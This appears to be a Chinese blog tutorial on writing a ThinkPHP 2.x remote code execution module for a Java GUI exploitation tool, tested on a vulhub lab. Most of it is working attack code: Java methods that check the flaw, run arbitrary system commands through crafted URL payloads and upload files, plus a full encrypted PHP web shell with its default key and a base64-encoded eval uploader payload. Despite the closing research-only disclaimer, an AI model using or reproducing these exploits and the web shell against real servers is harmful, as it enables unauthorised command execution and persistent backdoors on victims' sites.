<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ZkfDmaBl2wgL0Zs4AF-C2A)

> 为了提高大佬们提交 PR 的积极性，我也是拼了（这样我就可以名正言顺的偷懒了）

0x01 选漏洞，新建文件
-------------

比如 ThinkPHP2.x 的任意代码执行，使用 vulhub 搭建漏洞

https://vulhub.org/#/environments/thinkphp/2-rce/

docker-compose up -d 一键搭建

现在还没有 ThinkPHP 相关的利用架子，界面显示也没有，只是有个按钮 (我特意挑的，从图到 exp 编写一块教)

### 1.1 先把界面立起来

在 **src/main/resources** 下可以看到存在这么多 **fxml** 文件，直接复制一个 **Struts2.fxml**, 命名为 **ThinkPHP.fxml** 简答方便（若有大佬对界面不满意，请自个调，我不管了）![](https://mmbiz.qpic.cn/mmbiz_png/4bw9lT0keH1QY7ulEv4JkwsObG5KBK0YqePXnpRwembdgH5y3Wx4URWjknpmSHCJ4mg8cbzLgicWTbxHtYHLqfA/640?wx_fmt=png)

然后将 **Struts2Controller** 改为 **ThinkPHPController**, 再将 85 行的 test.jsp 改为 test.php![](https://mmbiz.qpic.cn/mmbiz_png/4bw9lT0keH1QY7ulEv4JkwsObG5KBK0YGt0dYUhiaJ1uAavNIastPBHSoicmgbGibE4X1v64eI6dq5ToNqGYg93Qw/640?wx_fmt=png)

会发现爆红，这是因为还没有 **ThinkPHP** 的逻辑控制。到这里再复制一份 **Struts2Controller.java** 改为 **ThinkPHPController.java** 即可

![](https://mmbiz.qpic.cn/mmbiz_png/4bw9lT0keH1QY7ulEv4JkwsObG5KBK0YxFeeIb35QU929wo1uN7Od1useWcX8S4J0HxtMiaXaxXvFSnPWq6jf6A/640?wx_fmt=png)  

还有一个，你要在界面有个按钮去控制显示，在 **src/main/resources/fxml/Main.fxml** 的 43 行，现在已经有个 **ThinkPHP** 的按钮了，如果没有，复制一行 <JFXButton ...> ，然后将 **accessibleText** 改为你新建的 **.fxml **一模一样的名字，再将** text** 改成你想显示的名称![](https://mmbiz.qpic.cn/mmbiz_png/4bw9lT0keH1QY7ulEv4JkwsObG5KBK0YfGJeoHicqYxq3AqE5smBG41eVq3Y6Czricl62EhJYfyVgEByR0f08jtQ/640?wx_fmt=png)

好了，现在界面好了，运行 **src/main/java/fun/fireline/AppStartUp.java** 看下吧

![](https://mmbiz.qpic.cn/mmbiz_png/4bw9lT0keH1QY7ulEv4JkwsObG5KBK0Y3R3JlWiaYFRud7bgDPKJpXG5LYpiaa2iciabyZsRibpZfPkrV9icFT6y3BicA/640?wx_fmt=png)  

新建一个界面简单吧

### 1.2 新建 exp 文件

现在 exp 包下，还没有新建 php 相关的漏洞（建包主要是为了方便管理，同类型的，放一个包下）

![](https://mmbiz.qpic.cn/mmbiz_png/4bw9lT0keH1QY7ulEv4JkwsObG5KBK0Y0bibTs5mhraj2uGhXrftWqibyts8kGRcDSib4vFQd8uK2La71sf5wmw7g/640?wx_fmt=png)  

右键新建 java 文件，**php.thinkphp.ThinkPHP2x** , 这表示在 **php** 包下的 **thinkphp** 包下新建 **ThinkPHP2x.java** 文件，没有包则创建包（你就说细不细吧）

![](https://mmbiz.qpic.cn/mmbiz_png/4bw9lT0keH1QY7ulEv4JkwsObG5KBK0Y8mRpv5muz94VT5WQic3RxbhCzzgRsU1E2GTKsvHw9cWoj6oy8AUSajg/640?wx_fmt=png)  
![](https://mmbiz.qpic.cn/mmbiz_png/4bw9lT0keH1QY7ulEv4JkwsObG5KBK0Yd2icDIKxrG6yqZWzxCfu9Gh7oHichDluapEvw7DJfd2en4oIibBnRrR5w/640?wx_fmt=png)  

一个 EXP 文件首先要实现 **ExploitInterface** 接口，看见爆红不要慌

![](https://mmbiz.qpic.cn/mmbiz_png/4bw9lT0keH1QY7ulEv4JkwsObG5KBK0YI1tMkeQRJp9WS4BLyN1ibEfUia8Fice1KugT8ccLkJxAuDPd2ibRLCu9xQ/640?wx_fmt=png)  

鼠标悬浮上去，点击实现全部方法（我就当大佬们都不会 java。怎么可能呢？！）

![](https://mmbiz.qpic.cn/mmbiz_png/4bw9lT0keH1QY7ulEv4JkwsObG5KBK0YZXBTXWXibibq3bian7ibicYFLrs5EBlMIYBAdbbdzRkQ6Wj2lbEnk7SxgPg/640?wx_fmt=png)  

框架好了，现在填 EXP，具体方法作用一看就懂了, 在类中再声明两个属性，一个 targe、一个 isVul

![](https://mmbiz.qpic.cn/mmbiz_png/4bw9lT0keH1QY7ulEv4JkwsObG5KBK0YSex85XfRMLXvIl95hYxJpIbzTsYmia39r60KQRkuZAica9dRia45dJhOQ/640?wx_fmt=png)  

### 1.3 代码和界面联动

接下来关注刚新建的 **ThinkPHPController.java** 文件，修改 49 行的 **BASICINFO** 和 **STRUTS2** 属性为![](https://mmbiz.qpic.cn/mmbiz_png/4bw9lT0keH1QY7ulEv4JkwsObG5KBK0YYicJv92skn6yJrnrCnwfB06Ciauiavx80swwnDZN0fwVAlFbfb9ImkXibg/640?wx_fmt=png)

使用 Ctrl + r 健, 将 STRUTS2 全部替换为 ThinkPHP

![](https://mmbiz.qpic.cn/mmbiz_png/4bw9lT0keH1QY7ulEv4JkwsObG5KBK0YicfHw4BepOCX3FhPclDFA51VbkuibmgOYvW2MnKcoFo8OduiaCGdskhew/640?wx_fmt=png)   再添加一个属性，默认上传的 shell

```
publicstatic String SHELL = "<?php\n" +
            "@error_reporting(0);\n" +
            "session_start();\n" +
            "    $key=\"e45e329feb5d925b\"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond\n" +
            "\t$_SESSION['k']=$key;\n" +
            "\tsession_write_close();\n" +
            "\t$post=file_get_contents(\"php://input\");\n" +
            "\tif(!extension_loaded('openssl'))\n" +
            "\t{\n" +
            "\t\t$t=\"base64_\".\"decode\";\n" +
            "\t\t$post=$t($post.\"\");\n" +
            "\t\t\n" +
            "\t\tfor($i=0;$i<strlen($post);$i++) {\n" +
            "    \t\t\t $post[$i] = $post[$i]^$key[$i+1&15]; \n" +
            "    \t\t\t}\n" +
            "\t}\n" +
            "\telse\n" +
            "\t{\n" +
            "\t\t$post=openssl_decrypt($post, \"AES128\", $key);\n" +
            "\t}\n" +
            "    $arr=explode('|',$post);\n" +
            "    $func=$arr[0];\n" +
            "    $params=$arr[1];\n" +
            "\tclass C{public function __invoke($p) {eval($p.\"\");\}\}\n" +
            "    @call_user_func(new C(),$params);\n" +
            "?>\n";


```

238 行也修改 test.jsp 改为 test.php

修改![](https://mmbiz.qpic.cn/mmbiz_png/4bw9lT0keH1QY7ulEv4JkwsObG5KBK0Y9g3BOWT4ica97PLicjg8z8pUKxXzK14FVOVc86D55ChYC3uQ6OBrdIyw/640?wx_fmt=png)

这个文件修改完毕，不用动了，以后再添加 thinkphp 相关漏洞，只需要改 **BASICINFO** 中的描述信息 (不加也可, 翻遍看)，**ThinkPHP** 还是要改的，这个是选择漏洞列表中的东西，往后添加就行。

下面去 **src/main/java/fun/fireline/tools/Tools.java** 文件， 找到 184 行的 **getExploit** 方法。

添加一个判断就行，![](https://mmbiz.qpic.cn/mmbiz_png/4bw9lT0keH1QY7ulEv4JkwsObG5KBK0YuypS2qxIItBukdFdic2RtwIrficbDib2FQoMY4wXn83r4npYHhY8uLyYQ/640?wx_fmt=png)

这就完了，看着图多，其实就几步，主要是为了详细

0x02 写 EXP 的具体实现
----------------

### 2.1 checkVul - 首先检测漏洞是否存在

Vulhub 也给了 payload，方便省事，使用 poc 打一下, 原 poc 是输出 phpinfo, 这里改成了输出一串字符![](https://mmbiz.qpic.cn/mmbiz_png/4bw9lT0keH1QY7ulEv4JkwsObG5KBK0YibZJbJLqRMWDGe9e24NEiczXya0iaHDG3DLfjaIZwf1WG1ulJsgurshuw/640?wx_fmt=png)

转成 java, 都是最基础的写法

```
// 检测漏洞是否存在
    @Override
    public boolean checkVul(String url) {
        this.target = url;
        // 这里可以通过判断对方是否执行了 md5 计算，输出 202cb962ac59075b964b07152d234b70 来验证漏洞是否存在
        String check_payload = "/index.php?s=/index/index/name/${@print(md5(123))}";
        // post 请求，根据不同的exp，可能需要不同的请求方式，看需更改，请求方式基本都实现了，若有遗漏，请提交issues
        try {
            // 使用 src/main/java/fun/fireline/tools/HttpTool.java 工具包中的 get 方法提交
            // 注意 这要用 try  catch 捕获一下异常
            String result = HttpTool.getHttpReuest(this.target + check_payload, "UTF-8");
            // 看回显，是否存在 202cb962ac59075b964b07152d234b70
            System.out.println(result);
            boolean flag = result.contains("202cb962ac59075b964b07152d234b70");
            if(flag) {
                this.isVul = true;  // 存在漏洞
            }
            return flag;

        } catch (Exception e) {
            // 输出错误日志
            logger.error(e);
        }

        returnfalse;
    }


```

写完测试一下

运行 **AppStartUp.java**，测试一下

![](https://mmbiz.qpic.cn/mmbiz_png/4bw9lT0keH1QY7ulEv4JkwsObG5KBK0YnRfkuRBxJd1XbhibqZvufR7l5Pq3gJhonL5cJC31UGDbbOJeI1vvyhQ/640?wx_fmt=png)  

成功，而且可以设置代理，走 bp，看具体流量

![](https://mmbiz.qpic.cn/mmbiz_png/4bw9lT0keH1QY7ulEv4JkwsObG5KBK0YTPLV9ph7mGZHmQSdUEgh2mCicpnJCJjvdaTI3bqZficjIVic26sYQibwPg/640?wx_fmt=png)  
![](https://mmbiz.qpic.cn/mmbiz_png/4bw9lT0keH1QY7ulEv4JkwsObG5KBK0Yjic1FsxsU4XQ8v2ub4nRiagKRcfaQ7Mtj8A5mYNDjwJ7f0EVniapFm87A/640?wx_fmt=png)  

### 2.2 getWebPath 获取网站根目录

这个写不写都行，这里写一下吧, thinkphp 可以通过`realpath(__ROOT__)`来获取网站的根路径，改下 payload 就好

`/index.php?s=/index/index/name/${@print(realpath(__ROOT__))}`

```
// 获取当前的web路径，有最好，没有也无所谓
    @Override
    public String getWebPath() {
        String payload = "/index.php?s=/index/index/name/${@print(realpath(__ROOT__))}";
        try {
            String result = HttpTool.getHttpReuest(this.target + payload, "UTF-8");
            // 这个payload会把 html网页也给输出，这里分割简单去除一下
            return result.split("<!DOCTYPE html")[0];

        } catch (Exception e) {
            logger.error(e);
        }
        return"命令执行失败";
    }


```

![](https://mmbiz.qpic.cn/mmbiz_png/4bw9lT0keH1QY7ulEv4JkwsObG5KBK0Yem69FRI6DuknGR1oBfFDEkfwEEmEhkmTRRo4PhkQEbam7tonGLjj6A/640?wx_fmt=png)  

### 2.3 exeCmd  执行命令

这里先将 **isVul** 方法改一下，命令执行依赖于检测，只有检测存在，才能进行命令执行

```
@Override
    public boolean isVul() {
        returnthis.isVul;
    }


```

Payload `/index.php?s=/index/index/name/${@print(system(whoami))}`

```
// 命令执行
    @Override
    public String exeCmd(String cmd, String encoding) {
        String payload = "/index.php?s=/index/index/name/${@print(system(payload))}";
        try {
            // 替换payload 中的 payload 字符为要执行的命令
            payload = payload.replace("payload", cmd);
            String result = HttpTool.getHttpReuest(this.target + payload, "UTF-8");
            return result.split("<!DOCTYPE html")[0];

        } catch (Exception e) {
            logger.error(e);
        }
        return"fail";
    }


```

测试通过

![](https://mmbiz.qpic.cn/mmbiz_png/4bw9lT0keH1QY7ulEv4JkwsObG5KBK0Yic7rJ1fBsgvkEP2duJe8LLvRUrBnxpricHKtkgbOEAzHeIxkbkQxa33A/640?wx_fmt=png)  

### 2.4 uploadFile 上传 shell

Payload `http://127.0.0.1:8080/index.php?s=/index/index/name/${${@eval($_POST[1])\}\}` 这是网上的 payload，上传后使用蚁剑连接即可

虽然，直接使用这个 payload 也可用，但不方便我们自定义上传的 shell 马

@bewhale 师傅的 thinkphp 利用工具 https://github.com/bewhale/thinkphp_gui_tools 中使用这个 payload 来上传文件

`/index.php?s=/sd/iex/xxx/${@eval($_GET[x])}&x=file_put_contents('bak.php',base64_decode('PD9waHAgJGE9In4rZCgpIl4iIXsre30iO0AkYj1iYXNlNjRfZGVjb2RlKCR7JGF9WyJhIl0pO2V2YWwoIiIuJGIpOz8%2B'));`

拿来直接用

```
@Override
    public String uploadFile(String fileContent, String filename, String platform) throws Exception {
        String result = "";
        // 对文件 base64 编码
        String base64Data = Base64.getEncoder().encodeToString(fileContent.getBytes());
        // 注意一下，需要对 base64 编码后的在进行一次url编码，
        base64Data = URLEncoder.encode(base64Data, "UTF-8" );

        String payload = "/index.php?s=/sd/iex/xxx/${@eval($_GET[x])}&x=file_put_contents('" + filename + "',base64_decode('" + base64Data + "'));";

        HttpTool.getHttpReuest(this.target + payload, "UTF-8");

        // 上传后，访问一次上传的文件，看返回值是否为200来判断是否上传成功
        int status = HttpTool.getStatus(this.target + "/" + filename);

        System.out.println(this.target + "/" + filename);
        System.out.println(status);
        if(status == 200) {
            result = "上传成功! 路径：" + this.target + "/" + filename;
        } else {
            result =  "上传失败， 请用这个payload，蚁剑连接试一下 /index.php?s=/index/index/name/${${@eval($_POST[1])\}\}";
        }

        return result;
    }


```

![](https://mmbiz.qpic.cn/mmbiz_png/4bw9lT0keH1QY7ulEv4JkwsObG5KBK0Yu0p0h37EVJnV8GHIWDrCN6KMSzIU82P11RJwKIprzUXemtAySUoBFA/640?wx_fmt=png)  

打完收工

**免责声明：本文仅供安全研究与讨论之用，严禁用于非法用途，违者后果自负。**

![](https://mmbiz.qpic.cn/mmbiz_jpg/4bw9lT0keH1glXYFNRm1k28m4mYH7KkAlMjx3y4AyoJag8dRhY0SXlqsX9YH4GnpBvkr5UcUw5Q47HqibM1vjFQ/640?wx_fmt=jpeg)